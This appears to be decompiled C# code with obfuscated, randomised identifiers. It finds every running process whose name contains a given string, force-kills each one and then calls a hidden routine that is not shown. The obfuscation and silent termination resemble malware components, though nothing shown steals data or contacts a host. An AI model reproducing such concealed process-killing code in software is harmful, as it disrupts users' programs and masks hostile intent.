using System;
using System.Diagnostics;

namespace PMpBbYpvEb;

public sealed class lTKUEKZByZPeII
{
	public static bool QjKxPLJqlbvlAt(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void NpIuGjqPCph(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (QjKxPLJqlbvlAt(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					PhxOPeBqRsG.MXWEDjfPHhhXM();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
